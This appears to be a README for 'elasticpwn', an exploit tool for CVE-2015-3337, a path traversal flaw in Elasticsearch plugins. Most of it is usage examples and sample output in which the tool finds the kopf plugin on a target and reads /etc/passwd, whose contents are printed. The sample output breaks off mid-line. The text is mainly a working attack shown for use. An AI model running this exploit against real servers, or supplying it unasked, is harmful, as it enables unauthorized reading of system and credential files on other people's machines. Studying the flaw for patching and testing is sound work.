# elasticpwn
Script for ElasticSearch url path trasversal vuln. CVE-2015-3337


```
[crg@segfault ~]$ ./elasticpwn.py
!dSR ElasticPwn - for CVE-2015-3337

Ex: ./elasticpwn.py www.example.com /etc/passwd

[crg@segfault ~]$ ./elasticpwn.py elasticsearch-test /etc/passwd
!dSR ElasticPwn - for CVE-2015-3337

[*] Trying to find plugin test:
[-]  Not Found
[*] Trying to find plugin kopf:
[+] Plugin found!
	[*] Trying to retrieve /etc/passwd:

HTTP/1.0 200 OK
Content-Type:
Content-Length: 1530

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
puppet:x:103:108:Puppet configuration management daemon,,,:/var/lib/puppet:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
nslcd:x:105:109:nslcd name service LDAP connection daemon,,,:/var/run/nslcd/:/bin/false
postfix:x:106:111::/var/spool/postfix:/bin/false
statd:x:107:65534::/var/lib/nfs:/bin/false
_lldpd:x:108:113::/var/run/lldp
```
